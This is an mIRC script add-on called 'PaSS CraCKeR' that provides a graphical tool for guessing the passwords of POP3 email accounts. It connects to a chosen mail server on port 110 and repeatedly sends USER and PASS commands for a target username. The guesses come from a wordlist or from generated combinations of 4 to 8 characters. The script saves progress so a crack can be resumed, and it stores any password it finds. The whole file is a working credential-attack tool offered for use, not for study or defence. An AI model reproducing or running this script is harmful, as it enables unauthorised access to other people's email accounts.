; 
;
;
; if you want to see the msg you received from the POP3 server, goto line 251 and remove the ";"
;
; ####################DO NOT EDIT ANYTHING BELOW !!! ####################


alias pcrack {
  unset %pc.*
  if ($exists($mircdirphoto\pc.bmp) == $false) { echo -s 6- | echo -s 6*** Missing file : pc.bmp | echo -s 6- | halt }
  window -c @Pass_Cracker
  window -p @PaSS_CraCKeR 99 55 407 247
  window -n @Pass_Log 97 71 487 242
  drawfill @PaSS_CraCKeR 15 15 45 45
  drawrect @Pass_Cracker 14 1 285 127 102 82
  drawpic @Pass_Cracker 288 130 $mircdirphoto\pc.bmp
  drawtext @PaSS_CraCKeR 1 arial 16 10 10 POP3 Server :
  drawrect -f @Pass_Cracker 0 1 4 30 200 20
  drawline @pass_Cracker 1 1 5 30 5 51 5 29 205 29
  drawline @Pass_Cracker 14 1 4 28 4 51 4 28 206 28
  drawline @Pass_Cracker 0 1 4 52 206 52 206 52 206 28
  drawtext @PaSS_CraCKeR 1 arial 16 10 60 Username :
  drawrect -f @Pass_Cracker 0 1 4 80 200 20
  drawline @pass_Cracker 1 1 5 79 5 101 5 79 205 79
  drawline @Pass_Cracker 14 1 4 78 4 102 4 78 206 78
  drawline @Pass_Cracker 0 1 4 102 207 102 206 102 206 78
  drawrect @Pass_Cracker 14 1 5 126 268 82
  drawline @Pass_Cracker 0 1 272 127 6 127 6 207
  drawline @pass_Cracker 0 1 5 209 274 209 274 126
  drawrect -f @Pass_Cracker 15 1 34 124 115 10
  drawtext @PaSS_CraCKeR 1 arial 16 38 118 Word List options :
  drawtext @PaSS_CraCKer 1 arial 16 29 140 Use a Word List 
  drawrect -f @Pass_Cracker 0 1 14 143 8 8 14 163 8 8
  drawline @Pass_Cracker 1 1 14 152 14 143 23 143
  drawline @Pass_Cracker 14 1 13 153 13 142 24 142
  drawline @Pass_Cracker 0 1 14 153 24 153 24 143
  drawtext @PaSS_CraCKeR 1 arial 16 29 159 Don´t use a Word List
  drawline @Pass_Cracker 1 1 14 171 14 162 23 162 
  drawline @Pass_Cracker 14 1 13 172 13 161 24 161
  drawline @Pass_Cracker 0 1 13 173 24 173 24 161
  drawtext @pass_Cracker 1 arial 16 277 16 Connect
  drawline @Pass_CraCKeR 0 1 223 37 223 13 384 13 
  drawline @Pass_CraCKeR 1 1 224 37 384 37 384 13
  drawline @Pass_Cracker 14 1 225 36 383 36 383 12
  drawtext @pass_Cracker 1 arial 16 284 51 Abort
  drawline @Pass_CraCKeR 0 1 223 71 223 47 384 47
  drawline @Pass_CraCKeR 1 1 224 71 384 71 384 47
  drawline @Pass_CraCKeR 14 1 225 70 383 70 383 46
  drawtext @pass_Cracker 1 arial 16 290 93 Help 
  drawline @Pass_Cracker 0 1 223 113 223 89 384 89  
  drawline @Pass_Cracker 1 1 224 113 384 113 384 89
  drawline @Pass_CraCKeR 14 1 225 112 383 112 383 88
}  

alias chk.sclik {
  if ($mouse.x > 5) && ($mouse.x < 206) && ($mouse.y > 28) && ($Mouse.y < 102) { vrble $mouse.y }
  elseif ($mouse.x > 223) && ($mouse.x < 384) && ($mouse.y > 13) && ($mouse.y < 113) { main $mouse.y }
  elseif ($mouse.x > 13) && ($mouse.x < 265) { word.opt $mouse.y $mouse.x }
}

alias vrble {
  if ($mouse.y > 28) && ($mouse.y < 51) { 
    :1
    set %pc.pop $$?="Enter the POP3 server : (Eg. email.com)"
    if ($pos(%pc.pop,.) == $null) { goto 1 }
    .drawrect -f @Pass_Cracker 0 1 6 30 198 20
    .drawtext @Pass_Cracker 1 arial 16 9 31 %pc.pop
    halt
  }
  elseif ($mouse.y > 78) && ($mouse.y < 102) { 
    set %pc.usnm $$?="Enter the Username : (Eg. Fred)"
    set %pc.tmp1 $readini $Mircdirpasscrkr.ini %pc.usnm wrdlst
    if (%pc.tmp1 == $null) { goto 2 }
    if (%pc.tmp1 != $null) { set %pc.tmp1 $$?="Already into my records. Erase it ? (Y/N)" }
    if (%pc.tmp1 == $null) || (%pc.tmp1 != y) { halt }
    :2
    .drawrect -f @Pass_Cracker 0 1 6 80 198 20
    .drawtext @Pass_Cracker 1 arial 16 9 82 %pc.usnm
    halt
  }
}

alias main {
  if ($mouse.y > 47) && ($mouse.y < 72) { 
    drawrect @Pass_Cracker 1 1 222 46 163 26 
    unset %pc.* 
    .timer -m 1 50 window -c @Pass_Cracker 
    /unload $mircdiraddon\passcrkr.mrc
    halt 
    
  }
  elseif ($mouse.y > 13) && ($mouse.y < 38) { 
    if (%pc.pop == $null) || (%pc.usnm == $null) || (%pc.wrdlst == $null) { beep | halt }
    elseif (%pc.pop != $null) && (%pc.usnm != $null) && (%pc.wrdlst != $null) { drawrect @Pass_Cracker 1 1 222 12 163 26 | .timer -m 1 50 .connect }
  }
  elseif ($mouse.y > 89) && ($mouse.y < 113) { pchelp }
}

alias pchelp {
  drawrect @Pass_Cracker 1 1 222 88 163 26
  .timer -m 1 120 drawrect @Pass_Cracker 15 1 222 88 163 26
  .window -p +t @HeLp 102 8 400 475
  drawfill @hElp 15 15 1 1 
  drawrect @HeLP 14 1 10 10 102 82
  drawpic @HeLp 13 13 $mircdirphoto\pc.bmp 
  drawtext @HeLp 2 arial 40 120 10 PaSS CraCKeR 
  drawtext @HeLp 2 arial 40 190 50 HeLp  
  drawtext @HeLp 2 arial 16 10 115 * On Menubar and Status popups
  drawtext @Help 2 arial 16 10 135 $str($chr(160),2) $+ - LoAd a CracK : a great feature of PaSS CraCKeR is that it 
  drawtext @Help 2 arial 16 18 155 records the last combination it sent to the POP3 server. So you 
  drawtext @Help 2 arial 16 18 175 can continue a crack.
  drawtext @Help 2 arial 16 10 195 $str($chr(160),2) $+ - New CrACK : as it says starts a new crack.
  drawtext @Help 2 arial 16 10 215 $str($chr(160),2) $+ - ErAsE a UsErnAmE : it erases a username recorded in 
  drawtext @Help 2 arial 16 18 235 $mircdir $+ passcrkr.ini.
  drawtext @Help 2 arial 16 10 255 $str($chr(160),2) $+ - ChEck a pAsswOrd : if you found the password, it will check
  drawtext @Help 2 arial 16 18 275 for it and display in the active window.
  drawtext @Help 2 arial 16 10 305 * On PaSS CraCKeR window
  drawtext @Help 2 arial 16 10 325 $str($chr(160),2) $+ - POP3 server : enter the POP3 server here.
  drawtext @Help 2 arial 16 10 345 $str($chr(160),2) $+ - Username : enter the username here.
  drawtext @Help 2 arial 16 10 365 $str($chr(160),2) $+ - Use a word list : if you choice this option you must specify a 
  drawtext @Help 2 arial 16 18 385 Word List file.
  drawtext @Help 2 arial 16 10 405 $str($chr(160),2) $+ - Don´t use a word list : if you choice this option you must specify a 
  drawtext @Help 2 arial 16 18 425 number of digits to try.
}

menu @HeLp {
  sclick:echo -s : $mouse.x , $mouse.y
}

alias word.opt {
  if ($1 > 142) && ($1 < 153) && ($2 > 13) && ($2 < 24) { 
    if (%pc.wrdlst == Yes) { halt }
    set %pc.wrfl $dir="Please select a wordlist file" $mircdir
    if (%pc.wrfl == $null) { halt }
    drawtext @Pass_Cracker 1 arial 13 17 140 x
    set %pc.wrdlst Yes 
    set %pc.totlns $lines(%pc.wrfl)
    drawrect -f @Pass_Cracker 15 1 129 173 20 20
    drawrect -f @Pass_Cracker 0 1 14 180 250 20
    drawrect -f @Pass_Cracker 0 1 16 164 5 7
    drawline @PAss_Cracker 1 1 14 200 14 179 264 179
    drawline @PAss_Cracker 14 1 13 201 13 178 266 178
    drawline @Pass_Cracker 0 1 13 202 266 202 266 178
    drawtext @Pass_Cracker 1 arial 16 16 182 %pc.wrfl
    halt      
  } 
  elseif ($1 > 161) && ($1 < 172) && ($2 > 13) && ($2 < 24) { 
    set %pc.wrdlst No 
    drawrect -f @Pass_Cracker 0 1 15 145 6 6
    drawrect -f @Pass_Cracker 15 1 11 177 260 25
    drawtext @Pass_Cracker 1 arial 13 17 160 x
    drawtext @Pass_Cracker 1 arial 12 130 174 Digits :
    drawrect -f @Pass_Cracker 0 1 15 190 8 8    
    drawline @Pass_Cracker 1 1 15 198 15 189 24 189
    drawline @Pass_Cracker 14 1 14 199 14 188 25 188
    drawline @Pass_Cracker 0 1 14 200 25 200 25 188
    drawtext @Pass_Cracker 1 arial 16 33 186 4
    drawrect -f @Pass_Cracker 0 1 69 190 8 8 
    drawline @Pass_Cracker 1 1 69 198 69 189 78 189
    drawline @Pass_Cracker 14 1 68 199 68 188 79 188
    drawline @pass_Cracker 0 1 68 200 79 200 79 188     
    drawtext @Pass_Cracker 1 arial 16 89 186 5
    drawrect -f @Pass_Cracker 0 1 123 190 8 8 
    drawline @Pass_Cracker 1 1 123 198 123 189 132 189
    drawline @Pass_Cracker 14 1 122 199 122 188 133 188
    drawline @Pass_Cracker 0 1 122 200 133 200 133 188
    drawtext @Pass_Cracker 1 arial 16 143 186 6
    drawrect -f @Pass_Cracker 0 1 177 190 8 8 
    drawline @Pass_Cracker 1 1 177 198 177 189 186 189
    drawline @Pass_Cracker 14 1 176 199 176 188 187 188
    drawline @Pass_Cracker 0 1 176 200 187 200 187 188
    drawtext @Pass_Cracker 1 arial 16 195 186 7
    drawrect -f @pass_Cracker 0 1 231 190 8 8 
    drawline @Pass_Cracker 1 1 231 198 231 189 240 189
    drawline @Pass_Cracker 14 1 230 199 230 188 241 188
    drawline @Pass_Cracker 0 1 230 200 241 200 241 188
    drawtext @Pass_Cracker 1 arial 16 250 186 8
    halt
  }
  elseif ($1 > 178) && ($1 < 202) {
    if (%pc.wrdlst == $null) { halt } 
    elseif (%pc.wrdlst == Yes) { 
      set %pc.wrfl $dir="Please select a wordlist file" $mircdir
      if (%pc.wrfl == $null) { halt }
      drawrect -f @Pass_Cracker 0 1 15 180 248 18      
      drawtext @Pass_Cracker 1 arial 16 16 182 %pc.wrfl
    }
    elseif (%pc.wrdlst == No) { 
      if ($2 > 14) && ($2 < 25) { set %pc.dgt 4 | goto clean }
      elseif ($2 > 68) && ($2 < 79) { set %pc.dgt 5 | goto clean }
      elseif ($2 > 122) && ($2 < 133) { set %pc.dgt 6 | goto clean }
      elseif ($2 > 176) && ($2 < 187) { set %pc.dgt 7 | goto clean }
      elseif ($2 > 230) && ($2 < 241) { set %pc.dgt 8 | goto clean }
      :clean
      drawrect -f @PAss_Cracker 0 1 16 190 7 7 70 190 7 7 124 190 7 7 178 190 7 7 232 190 7 7
      if (%pc.dgt == 4) { drawtext @Pass_Cracker 1 arial 13 18 187 x }
      elseif (%pc.dgt == 5) { drawtext @Pass_Cracker 1 arial 13 72 187 x }
      elseif (%pc.dgt == 6) { drawtext @Pass_Cracker 1 arial 13 126 187 x }
      elseif (%pc.dgt == 7) { drawtext @Pass_Cracker 1 arial 13 180 187 x }
      elseif (%pc.dgt == 8) { drawtext @Pass_Cracker 1 arial 13 234 187 x }
    }
  }  
}  

alias connect {
  window -c @Pass_Cracker
  window -p @ConNeCting 174 103 280 84 arial,712
  drawfill @ConNeCting 15 15 1 1
  drawtext @ConNeCting 1 arial 16 7 16 Status : Looking up POP3 server ...
  /dns %pc.pop
}

on 1:dns: {
  if (%pc.pop == $null) { halt }
  elseif ($window(@ConNeCting).state == $null) { unset %pc.* | Halt }
  elseif ($raddress != $null) { 
    drawrect -f @ConNeCting 15 1 1 1 280 84 
    drawtext @ConNeCting 1 arial 16 7 16 Status : POP3 server found ... 
    sockclose Pc
    set %pc.dgt2 %pc.dgt
    if (%pc.num == $null) { set %pc.num 1 }
    if (%pc.1 == $null) { set %pc.1 97 }
    if (%pc.2 == $null) { set %pc.2 97 }
    if (%pc.3 == $null) { set %pc.3 97 } 
    if (%pc.4 == $null) { set %pc.4 97 }
    if (%pc.5 == $null) { set %pc.5 97 }
    if (%pc.6 == $null) { set %pc.6 97 }
    if (%pc.7 == $null) { set %pc.7 97 }
    if (%pc.8 == $null) { set %pc.8 97 }
    window -c @Connecting
    window -p @CracKinG 227 117 176 107
    drawfill @Cracking 15 15 1 1 
    drawtext @CracKinG 1 arial 16 7 8 Combination : (none)
    drawtext @CracKinG 1 arial 16 7 26 Status : (none) 
    drawline @Cracking 0 1 7 72 7 52 157 52
    drawline @Cracking 1 1 157 53 157 72 7 72
    drawline @Cracking 14 1 8 71 156 71 156 53
    drawtext @Cracking 1 arial 16 65 54 Abort
    sockopen Pc %pc.pop 110
    halt
  }
  elseif ($raddress == $null) {
    drawrect -f @ConNeCting 15 1 1 1 280 84 
    drawtext @ConNeCting 1 arial 16 7 16 Status : POP3 server could not be resolved ... 
    unset %pc.*
  }
}

on 1:sockread:Pc:{
  if ($sockerr > 0) { return }
  writeini $mircdirpasscrkr.ini %pc.usnm lstcmb %pc.cmb
  :reading
  sockread %pc.tmp
  if ($sockbr == 0) {  .timeragain 1 60 chk.close1 | return }
  if (+OK isin %pc.tmp) && $window(@Pass_log) != $null) { aline @Pass_Log - %pc.tmp }
  if (-ERR isin %pc.tmp) { 
    if ($window(@cracking) == $null) { crack.abort | echo -s 6- | echo -s 6*** Do not close cracking window !! | echo -s 6- | return }
    set %pc.tmp %pc.tmp $+ $chr(32) $+ ( $+ %pc.cmb $+ )
    if ($window(@Pass_log) != $null) { aline @Pass_Log - %pc.tmp }
    drawrect -f @cracking 15 1 92 9 100 20
    drawrect -f @cracking 15 1 56 26 100 20
    drawtext @cracking 1 arial 16 90 8 %pc.cmb
    drawtext @cracking 1 arial 16 58 26 Failed
  }
  elseif (message isin %pc.tmp) { 
    if ($exists($mircdirsound\passfnd.wav) == $true) { splay $mircdirsound\passfnd.wav }
    window -p @PaSS_FouNd 184 121 275 120
    drawfill @Pass_found 15 15 1 1
    drawtext @Pass_found 1 arial 20 60 7 Password Found !!!
    drawtext @Pass_found 1 arial 16 7 30 login : %pc.usnm
    drawtext @Pass_found 1 arial 16 7 50 pass : %pc.cmb
    drawtext @Pass_found 1 arial 16 7 70 pop server : %pc.pop
    writeini $mircdirpasscrkr.ini %pc.usnm pass %pc.cmb
    remini $mircdirpasscrkr.ini %pc.usnm lstcmb
    crack.abort 
    return
  }
  goto reading
}

alias chk.close1 if ($sock(Pc) != $null) { crack.abort | echo -s 6- | echo -s 6*** Connection timed out ... | echo -s 6- | return }

on 1:waveend: {
  inc %pc.stimes 
  if (%pc.stimes == 3) { halt }
  splay $mircdirspund\passfnd.wav
}

on 1:sockclose:Pc:chk.close

alias chk.close {
  if (%pc.abort == Yes) { halt }
  if (%pc.wrdlst == No) && (%pc.dgt2 < %pc.dgt) { 
    window -c @Cracking
    echo -s 6 -
    echo -s 6*** Password not found for : %pc.usnm 
    echo -s 6 - 
    echo -s 6*** Used %pc.dgt2 digits 
    remini $mircdirpasscrkr.ini %pc.usnm
    unset %pc.* 
    pop3end
    halt 
  }
  elseif (%pc.wrdlst == Yes) && (%pc.num > %pc.totlns) { 
    window -c @Cracking 
    echo -s 6 - 
    echo -s 6*** Password not found for : %pc.usnm 
    echo -s 6 - 
    echo -s 6*** Used word file : %pc.wrfl 
    remini $mircdirpasscrkr.ini %pc.usnm
    unset %pc.* 
    pop3end
    halt 
  }
  .timer -m 1 500 sockopen Pc %pc.pop 110
  
}

alias crack.abort {
  set %pc.abort Yes
  sockclose Pc
  drawrect @Cracking 1 1 6 51 152 22
  .timer -m 1 50 window -c @Cracking
  writeini $mircdirpasscrkr.ini %pc.usnm pop3 %pc.pop
  if (%pc.wrdlst == No) { writeini $mircdirpasscrkr.ini %pc.usnm lstcmb %pc.cmb }
  elseif (%pc.wrdlst == Yes) { writeini $mircdirpasscrkr.ini %pc.usnm lstln %pc.num | writeini $mircdirpasscrkr.ini %pc.usnm wrfl %pc.wrfl }
  writeini $mircdirpasscrkr.ini %pc.usnm wrdlst %pc.wrdlst
  .timerPlease_do_not_stop_this_timer=) 1 3 unset %pc.*
  pop3end
  halt 
  
}

on 1:sockopen:Pc: {
  if ($timer(again) != $null) { .timeragain off }
  if (%pc.wrdlst == No) { sockwrite -tn Pc user %pc.usnm | .timer -m 1 500 sockwrite -tn Pc pass $wrdlets }
  elseif (%pc.wrdlst == Yes) { sockwrite -tn Pc user %pc.usnm | .timer -m 1 500 sockwrite -tn Pc pass $wrdread }
}

alias wrdread { set %pc.cmb $read -l $+ %pc.num %pc.wrfl | inc %pc.num | return %pc.cmb }

alias lcrack {
  set %pc.pop $readini $mircdirpasscrkr.ini %pc.usnm pop3
  if (%pc.pop == $null) { /echo -s No match user. | unset %pc.* | halt }
  set %pc.wrdlst $readini $mircdirpasscrkr.ini %pc.usnm wrdlst
  if (%pc.wrdlst == No) { 
    set %pc.cmb $readini $mircdirpasscrkr.ini %pc.usnm lstcmb
    if (%pc.cmb == $null) { echo -s No match user. | unset %pc.* | halt }
    if ($do.chrs(%pc.cmb) == Ok) { set %pc.dgt2 $len(%pc.dgt) | connect }
  }
  elseif (%pc.wrdlst == Yes) { 
    set %pc.wrfl $readini $mircdirpasscrkr.ini %pc.usnm wrfl
    if ($exists(%pc.wrfl) == $false) { echo -s No match Word List ( $+ %pc.wrfl $+ ) | unset %pc.* | halt }
    set %pc.totlns $lines(%pc.wrfl)
    set %pc.num $readini $mircdirpasscrkr.ini %pc.usnm lstln
    if ($wrdread == %pc.cmb) { connect }
  }
}

alias wrdlstmk {
  if ($1 == Old) { set %pc.num $lines(%pc.wrfl) | set %pc.tmp1 $read -l $+ %pc.num %pc.wrfl | if ($do.chrs(%pc.tmp1) == Ok) { } | write %pc.wrfl $chr(32) | goto 2 }
  set %pc.dgt 4
  set %pc.1 97 
  set %pc.2 97 
  set %pc.3 97 
  set %pc.4 97 
  set %pc.5 97
  set %pc.6 97
  set %pc.7 97
  set %pc.8 97
  :2
  window @Progress 226 128 211 62
  .aline @Progress 2Current Combination : 4(None)
  .aline @Progress 2Elapsed Time :4 0secs
  set %pc.idle $idle
  set %pc.eidle 1
  :writing
  if (%pc.idle < $idle) { set %pc.idle $idle | inc %pc.eidle } 
  .rline @Progress 2 2Elapsed Time :4 $duration(%pc.eidle)
  .rline @Progress 1 2Current Combination :4 %pc.cmb
  write %pc.wrfl $wrdlets
  if (%pc.end == Ok) { echo -s 2Ok. | goto end }
  goto writing
  :end
}

alias do.chrs {
  set %pc.dgt $len($1)
  set %pc.tmp1 1
  :doing
  if (%pc.tmp1 > %pc.dgt) { inc %pc. [ $+ [ $calc(%pc.tmp1 - 1) ] ] | return Ok }
  set %pc. [ $+ [ %pc.tmp1 ] ] $asc($mid($1,%pc.tmp1,1))
  inc %pc.tmp1
  goto doing
}

alias chek.pass {
  set %pc.usnm $$?="Enter the username :" 
  if (%pc.usnm == $null) { halt }
  set %pc.tmp1 $readini $mircdirpasscrkr.ini %pc.usnm pass 
  if (%pc.tmp1 == $null) { echo -a 6*** No Pass found for : %pc.usnm | goto end } 
  elseif (%pc.tmp1 != $null) { echo -a 6*** Pass for : %pc.usnm | echo -a 6- | echo -a 6*** %pc.tmp1 | goto end } 
  :end 
  unset %pc.* 
  halt 
}

alias wrdlets {
  goto %pc.dgt
  :4
  if (%pc.4 == 123) { set %pc.4 48 | goto 4 }
  elseif (%pc.4 == 58) { set %pc.4 95 | goto 4 }
  elseif (%pc.4 == 96) { set %pc.4 97 | inc %pc.3 | goto 4 }
  elseif (%pc.3 == 123) { set %pc.3 48 | goto 4 }
  elseif (%pc.3 == 58) { set %pc.3 95 | goto 4 } 
  elseif (%pc.3 == 96) { set %pc.3 97 | inc %pc.2 | goto 4 }
  elseif (%pc.2 == 123) { set %pc.2 48 | goto 4 }
  elseif (%pc.2 == 58) { set %pc.2 95 | goto 4 } 
  elseif (%pc.2 == 96) { set %pc.2 97 | inc %pc.1 | goto 4 }
  elseif (%pc.1 == 123) { set %pc.1 48 | goto 4 }
  elseif (%pc.1 == 58) { set %pc.1 95 | goto 4 } 
  elseif (%pc.1 == 96) { set %pc.1 97 | set %pc.2 97 | set %pc.3 97 | set %pc.4 97 | inc %pc.dgt | goto 5 }
  inc %pc.4
  set %pc.cmb $chr(%pc.1) $+ $chr(%pc.2) $+ $chr(%pc.3) $+ $chr($calc(%pc.4 - 1))
  return %pc.cmb
  :5
  if (%pc.5 == 123) { set %pc.5 48 | goto 5 }
  elseif (%pc.5 == 58) { set %pc.5 95 | goto 5 }
  elseif (%pc.5 == 96) { set %pc.5 97 | inc %pc.4 | goto 5 }
  elseif (%pc.4 == 123) { set %pc.4 48 | goto 5 }
  elseif (%pc.4 == 58) { set %pc.4 95 | goto 5 } 
  elseif (%pc.4 == 96) { set %pc.4 97 | inc %pc.3 | goto 5 }
  elseif (%pc.3 == 123) { set %pc.3 48 | goto 5 }
  elseif (%pc.3 == 58) { set %pc.3 95 | goto 5 } 
  elseif (%pc.3 == 96) { set %pc.3 97 | inc %pc.2 | goto 5 }
  elseif (%pc.2 == 123) { set %pc.2 48 | goto 5 }
  elseif (%pc.2 == 58) { set %pc.2 95 | goto 5 } 
  elseif (%pc.2 == 96) { set %pc.2 97 | inc %pc.1 | goto 5 }
  elseif (%pc.1 == 123) { set %pc.1 48 | goto 5 }
  elseif (%pc.1 == 58) { set %pc.1 95 | goto 5 } 
  elseif (%pc.1 == 96) { set %pc.1 97 | set %pc.2 97 | set %pc.3 97 | set %pc.4 97 | set %pc.5 97 | inc %pc.dgt | goto 6 }
  inc %pc.5
  set %pc.cmb $chr(%pc.1) $+ $chr(%pc.2) $+ $chr(%pc.3) $+ $chr(%pc.4) $+ $chr($calc(%pc.5 - 1))
  return %pc.cmb
  :6
  if (%pc.6 == 123) { set %pc.6 48 | goto 6 }
  elseif (%pc.6 == 58) { set %pc.6 95 | goto 6 }
  elseif (%pc.6 == 96) { set %pc.6 97 | inc %pc.5 | goto 6 }
  elseif (%pc.5 == 123) { set %pc.5 48 | goto 6 }
  elseif (%pc.5 == 58) { set %pc.5 95 | goto 6 } 
  elseif (%pc.5 == 96) { set %pc.5 97 | inc %pc.4 | goto 6 }
  elseif (%pc.4 == 123) { set %pc.4 48 | goto 6 }
  elseif (%pc.4 == 58) { set %pc.4 95 | goto 6 } 
  elseif (%pc.4 == 96) { set %pc.4 97 | inc %pc.3 | goto 6 }
  elseif (%pc.3 == 123) { set %pc.3 48 | goto 6 }
  elseif (%pc.3 == 58) { set %pc.3 95 | goto 6 } 
  elseif (%pc.3 == 96) { set %pc.3 97 | inc %pc.2 | goto 6 }
  elseif (%pc.2 == 123) { set %pc.2 48 | goto 6 }
  elseif (%pc.2 == 58) { set %pc.2 95 | goto 6 } 
  elseif (%pc.2 == 96) { set %pc.2 97 | inc %pc.1 | goto 6 }
  elseif (%pc.1 == 123) { set %pc.1 48 | goto 6 }
  elseif (%pc.1 == 58) { set %pc.1 95 | goto 6 } 
  elseif (%pc.1 == 96) { set %pc.1 97 | set %pc.2 97 | set %pc.3 97 | set %pc.4 97 | set %pc.5 97 | set %pc.6 97 | inc %pc.dgt | goto 7 }
  inc %pc.6
  set %pc.cmb $chr(%pc.1) $+ $chr(%pc.2) $+ $chr(%pc.3) $+ $chr(%pc.4) $+ $chr(%pc.5) $+ $chr($calc(%pc.6 - 1))
  return %pc.cmb
  :7
  if (%pc.7 == 123) { set %pc.7 48 | goto 7 }
  elseif (%pc.7 == 58) { set %pc.7 95 | goto 7 }
  elseif (%pc.7 == 96) { set %pc.7 97 | inc %pc.6 | goto 7 }
  elseif (%pc.6 == 123) { set %pc.6 48 | goto 7 }
  elseif (%pc.6 == 58) { set %pc.6 95 | goto 7 } 
  elseif (%pc.6 == 96) { set %pc.6 97 | inc %pc.5 | goto 7 }
  elseif (%pc.5 == 123) { set %pc.5 48 | goto 7 }
  elseif (%pc.5 == 58) { set %pc.5 95 | goto 7 } 
  elseif (%pc.5 == 96) { set %pc.5 97 | inc %pc.4 | goto 7 }
  elseif (%pc.4 == 123) { set %pc.4 48 | goto 7 }
  elseif (%pc.4 == 58) { set %pc.4 95 | goto 7 } 
  elseif (%pc.4 == 96) { set %pc.4 97 | inc %pc.3 | goto 7 }
  elseif (%pc.3 == 123) { set %pc.3 48 | goto 7 }
  elseif (%pc.3 == 58) { set %pc.3 95 | goto 7 } 
  elseif (%pc.3 == 96) { set %pc.3 97 | inc %pc.2 | goto 7 }
  elseif (%pc.2 == 123) { set %pc.2 48 | goto 7 }
  elseif (%pc.2 == 58) { set %pc.2 95 | goto 7 } 
  elseif (%pc.2 == 96) { set %pc.2 97 | inc %pc.1 | goto 7 }
  elseif (%pc.1 == 123) { set %pc.1 48 | goto 7 }
  elseif (%pc.1 == 58) { set %pc.1 95 | goto 7 } 
  elseif (%pc.1 == 96) { set %pc.1 97 | set %pc.2 97 | set %pc.3 97 | set %pc.4 97 | set %pc.5 97 | set %pc.6 97 | set %pc.7 97 | inc %pc.dgt | goto 8 }
  inc %pc.7
  set %pc.cmb $chr(%pc.1) $+ $chr(%pc.2) $+ $chr(%pc.3) $+ $chr(%pc.4) $+ $chr(%pc.5) $+ $chr(%pc.6) $+ $chr($calc(%pc.7 - 1))
  return %pc.cmb
  :8
  if (%pc.8 == 123) { set %pc.8 48 | goto 8 }
  elseif (%pc.8 == 58) { set %pc.8 95 | goto 8 }
  elseif (%pc.8 == 96) { set %pc.8 97 | inc %pc.7 | goto 8 }
  elseif (%pc.7 == 123) { set %pc.7 48 | goto 8 }
  elseif (%pc.7 == 58) { set %pc.7 95 | goto 8 } 
  elseif (%pc.7 == 96) { set %pc.7 97 | inc %pc.6 | goto 8 }
  elseif (%pc.6 == 123) { set %pc.6 48 | goto 8 }
  elseif (%pc.6 == 58) { set %pc.6 95 | goto 8 } 
  elseif (%pc.6 == 96) { set %pc.6 97 | inc %pc.5 | goto 8 }
  elseif (%pc.5 == 123) { set %pc.5 48 | goto 8 }
  elseif (%pc.5 == 58) { set %pc.5 95 | goto 8 } 
  elseif (%pc.5 == 96) { set %pc.5 97 | inc %pc.4 | goto 8 }
  elseif (%pc.4 == 123) { set %pc.4 48 | goto 8 }
  elseif (%pc.4 == 58) { set %pc.4 95 | goto 8 } 
  elseif (%pc.4 == 96) { set %pc.4 97 | inc %pc.3 | goto 8 }
  elseif (%pc.3 == 123) { set %pc.3 48 | goto 8 }
  elseif (%pc.3 == 58) { set %pc.3 95 | goto 8 } 
  elseif (%pc.3 == 96) { set %pc.3 97 | inc %pc.2 | goto 8 }
  elseif (%pc.2 == 123) { set %pc.2 48 | goto 8 }
  elseif (%pc.2 == 58) { set %pc.2 95 | goto 8 } 
  elseif (%pc.2 == 96) { set %pc.2 97 | inc %pc.1 | goto 8 }
  elseif (%pc.1 == 123) { set %pc.1 48 | goto 8 }
  elseif (%pc.1 == 58) { set %pc.1 95 | goto 8 } 
  elseif (%pc.1 == 96) && (%pc.2 == 96) && (%pc.3 == 96) && (%pc.4 == 96) && (%pc.5 == 96) && (%pc.6 == 96) && (%pc.7 == 96) && (%pc.8 == 96) { set %pc.end Ok }
  inc %pc.8
  set %pc.cmb $chr(%pc.1) $+ $chr(%pc.2) $+ $chr(%pc.3) $+ $chr(%pc.4) $+ $chr(%pc.5) $+ $chr(%pc.6) $+ $chr(%pc.7) $+ $chr($calc(%pc.8 - 1))
  return %pc.cmb
}

menu Status,menubar {
  -
  &PaSS CraCKeR
  .WoRD LiSt
  ..MaKe a NeW: { echo -s 2Word List Maker v1.0 1by 4sUPr-jApA | echo -s 0,0: | echo -s 4 ********** ATTENTION : the file will be completely ERASED. ************* | echo -s 4please read | set %pc.wrfl $$?="Name of file : (Eg.: wordlist.txt) " | set %pc.wrfl $mircdir $+ %pc.wrfl | write -c %pc.wrfl | /wrdlstmk }
  ..ConTinue a WL: { echo -s 2Word List Maker v1.0 1by 4sUPr-jApA | set %pc.wrfl $dir="Select a file" $mircdir | if (%pc.wrfl == $null) { halt } | wrdlstmk Old }
  .CrACk
  ..LoAd CracK: { unset %pc.* | set %pc.usnm $$?="Enter the username : " | .lcrack }
  ..New CrACK:pcrack
  ..ErAsE a UsErnAmE:remini $mircdirpasscrkr.ini $$?="Enter the username :" | halt
  ..ChEck a pAsswOrd:chek.pass
}

menu @PaSS_CraCKeR { 
  sclick:/chk.sclik
}

menu @CracKinG {
  sclick: { if ($mouse.x > 8) && ($mouse.x < 157) && ($mouse.y > 52) && ($mouse.y < 72) { crack.abort } }
}
